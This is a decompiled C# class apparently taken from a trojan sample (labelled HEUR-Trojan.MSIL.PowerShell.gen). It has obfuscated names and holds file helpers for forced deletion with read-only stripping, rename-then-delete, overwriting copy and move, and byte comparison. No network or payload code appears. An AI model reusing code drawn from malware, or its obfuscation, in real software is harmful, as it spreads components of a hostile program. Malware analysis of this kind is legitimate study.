// Decompiled with JetBrains decompiler
// Type: s608480027755992.s916389884151353
// Assembly: s968508024776124, Version=2.0.47.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: E3596912-35E7-405B-A05A-F5F12AB5E292
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.PowerShell.gen-b1729c7ae8423cc844b16aa10ca8ddd2b2331adbfb6646d80d73381fbc73a109.exe

using s281263176400562;
using System;
using System.Collections.Generic;
using System.IO;

namespace s608480027755992
{
  internal static class s916389884151353
  {
    public static IEnumerable<string> s456312815446077(string s946048590104799)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      s538263490857989.s380043525593959 s380043525593959 = new s538263490857989.s380043525593959(-2);
      // ISSUE: reference to a compiler-generated field
      ((s916389884151353.s351524962893979) s380043525593959).s150513903148404 = s946048590104799;
      return (IEnumerable<string>) s380043525593959;
    }

    public static IEnumerable<string> s632067180131982(
      string[] s938279212144743,
      SearchOption s411457757509477 = SearchOption.TopDirectoryOnly)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      s916389884151353.s351524962893979 s351524962893979 = new s916389884151353.s351524962893979(-2);
      // ISSUE: reference to a compiler-generated field
      ((s916389884151353.s692541064960840) s351524962893979).s526216765418313 = s938279212144743;
      // ISSUE: reference to a compiler-generated field
      ((s916389884151353.s692541064960840) s351524962893979).s405386263173754 = s411457757509477;
      return (IEnumerable<string>) s351524962893979;
    }

    public static bool s760644410246924(string s252262365546032)
    {
      if (Directory.Exists(s252262365546032))
        return s538263490857989.s638795668894298(s252262365546032) != 0;
      if (!File.Exists(s252262365546032))
        return true;
      string str = s252262365546032;
      bool flag1 = true;
      if (!str.EndsWith(".deleting", StringComparison.OrdinalIgnoreCase))
      {
        flag1 = false;
        int num = 0;
        while (true)
        {
          str = s252262365546032 + "." + num.ToString() + ".deleting";
          if (File.Exists(str))
          {
            flag1 = true;
            ++num;
          }
          else
            break;
        }
        try
        {
          File.Move(s252262365546032, str);
        }
        catch (Exception ex)
        {
          str = s252262365546032;
        }
      }
      bool flag2 = false;
      try
      {
        flag2 = s916389884151353.s830039959015994(str);
        if (flag1)
        {
          string searchPattern = Path.GetFileName(s252262365546032) + ".*.deleting";
          foreach (string file in Directory.GetFiles(Path.GetDirectoryName(s252262365546032), searchPattern))
            s916389884151353.s830039959015994(file);
        }
      }
      catch
      {
      }
      return flag2;
    }

    public static bool s830039959015994(string s201615068843884)
    {
      bool flag = false;
      if (!File.Exists(s201615068843884))
        return true;
      try
      {
        FileAttributes attributes = File.GetAttributes(s201615068843884);
        if ((attributes & FileAttributes.ReadOnly) != (FileAttributes) 0)
        {
          FileAttributes fileAttributes = attributes & ~FileAttributes.ReadOnly;
          File.SetAttributes(s201615068843884, fileAttributes);
        }
        File.Delete(s201615068843884);
        flag = true;
      }
      catch (Exception ex)
      {
      }
      return flag;
    }

    public static void s010768774102548(string s518463655479550, string s506869461985119)
    {
      s916389884151353.s760644410246924(s506869461985119);
      File.Copy(s518463655479550, s506869461985119);
    }

    public static void s390345387705666(string s941914480520305, string s035794083030467)
    {
      s916389884151353.s760644410246924(s035794083030467);
      File.Move(s941914480520305, s035794083030467);
    }

    public static bool s863159290618453(string s819818498767579, string s770016875429323)
    {
      byte[] buffer1 = new byte[8192];
      byte[] buffer2 = new byte[8192];
      using (FileStream fileStream1 = File.Open(s819818498767579, FileMode.Open, FileAccess.Read))
      {
        using (FileStream fileStream2 = File.Open(s770016875429323, FileMode.Open, FileAccess.Read))
        {
          int num1 = fileStream1.Read(buffer1, 0, buffer1.Length);
          int num2 = fileStream2.Read(buffer2, 0, buffer2.Length);
          if (num1 != num2)
            return false;
          for (int index = 0; index < num1; ++index)
          {
            if ((int) buffer1[index] != (int) buffer2[index])
              return false;
          }
        }
      }
      return true;
    }
  }
}
